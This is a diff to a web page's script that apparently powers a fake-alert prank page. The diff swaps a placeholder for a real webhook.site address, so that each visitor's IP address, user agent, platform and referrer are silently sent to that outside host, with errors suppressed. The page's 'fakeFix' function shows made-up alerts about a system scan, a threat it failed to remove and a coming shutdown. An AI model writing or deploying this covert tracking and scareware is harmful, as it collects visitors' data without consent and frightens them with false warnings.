@@ -36,31 +36,30 @@
 </div>
 
 <script>
-// === IP Logging ===
+// === IP Logging using YOUR webhook ===
 fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
-      const ip = data.ip;
-      // Send IP to a free logging service (you can check it here: https://webhook.site)
-      fetch('https://webhook.site/YOUR-UNIQUE-ID-HERE', {
+      fetch('https://webhook.site/d49b7606-68c4-4697-bf43-2b647efae0f8', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-              ip: ip,
+              ip: data.ip,
               time: new Date().toLocaleString(),
               userAgent: navigator.userAgent,
-              platform: navigator.platform
+              platform: navigator.platform,
+              referrer: document.referrer
           })
       });
   })
   .catch(() => {});
 
-// Fake shutdown sequence
+// Fake actions
 function fakeFix() {
-    alert("🔍 Scanning system...");
+    alert("🔍 Scanning and fixing system...");
     setTimeout(() => {
         alert("❌ Failed to remove threat!\n\nSystem will shutdown to prevent damage.");
-    }, 1000);
+    }, 1200);
 }
 </script>
 
